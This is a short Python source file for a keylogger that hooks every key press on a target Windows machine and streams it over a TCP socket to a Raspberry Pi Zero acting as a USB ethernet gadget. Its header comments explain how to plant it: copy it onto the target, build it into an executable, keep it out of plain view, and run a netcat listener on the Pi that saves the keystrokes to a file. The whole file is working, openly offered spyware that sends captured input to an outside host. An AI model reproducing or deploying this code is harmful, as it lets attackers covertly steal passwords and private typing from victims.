# Python program to stream live key-presses to the pi zero over the usb gadget ethernet IP on port 9998
# Make sure to turn this into a Windows Executable!
# usage: 
#        first ensure the file is on the target by doing: scp root@172.16.0.1:/root/pathToFile C:\path\to\chosen\folder (or simply '.' if you don't care about the file existing in plain view)
#        on pi:: nc -lvp 9998 (to save it add the '> keylog.txt')
#        on target: .\key-net.exe 

import socket
import keyboard

# Initialize socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to remote host
sock.connect(('172.16.0.1', 9998))

# Function to send keys
def send_key(e):
    key = str(e.name)

    # Filters 
    # Add space after special keys
    if key == 'space':
        key += ' '
    elif key == 'enter':
        key += ' '
    elif key == 'backspace':
        key += ' '
    # TODO: Add more keys like SHIFT 
  
    sock.sendall(key.encode('utf-8'))

# Hook to capture keys
keyboard.on_press(send_key)
keyboard.wait()
